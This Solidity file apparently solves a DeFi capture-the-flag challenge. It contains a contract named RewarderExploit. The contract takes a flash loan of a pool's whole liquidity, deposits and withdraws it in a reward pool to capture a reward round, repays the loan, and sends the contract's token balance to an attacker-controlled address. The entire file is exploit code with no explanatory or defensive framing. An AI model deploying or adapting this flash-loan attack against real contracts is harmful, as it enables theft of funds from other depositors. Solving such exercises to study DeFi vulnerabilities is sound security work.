
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "hardhat/console.sol";

interface IRewarderPool {
	function deposit(uint256 amountToDeposit) external;
	function withdraw(uint256 amountToWithdraw) external;
	function distributeRewards() external returns (uint256);
	function roundNumber() external returns (uint256);
	
}

interface IFlashLoanPool {
	function flashLoan(uint256 amount) external;
	function liquidityToken() external view returns (IERC20);
}


contract RewarderExploit {
	IFlashLoanPool public pool;
	IRewarderPool public reward;
    address public attackerEOA;
	
	constructor (address poolAddress, address rewardAddress, address attacker) {
		pool = IFlashLoanPool(poolAddress);
		reward = IRewarderPool(rewardAddress);
		attackerEOA = attacker;
		// console.log("#1 rounds : ",reward.roundNumber());
		// reward.distributeRewards();
		// console.log("#2 rounds : ",reward.roundNumber());
		}
	
	function attack() external {

        uint256 amount = pool.liquidityToken().balanceOf(address(pool));
		pool.flashLoan(amount);
        
        uint256 eoaAmount = pool.liquidityToken().balanceOf(address(this));
        pool.liquidityToken().transfer(attackerEOA, eoaAmount);

    }
	function receiveFlashLoan(uint256 amount) external {
		pool.liquidityToken().approve(address(reward), amount);
		reward.deposit(amount);
		reward.withdraw(amount);
		//console.log("#3 rounds : ",reward.roundNumber());
		pool.liquidityToken().transfer(address(pool),amount);
 
	}
}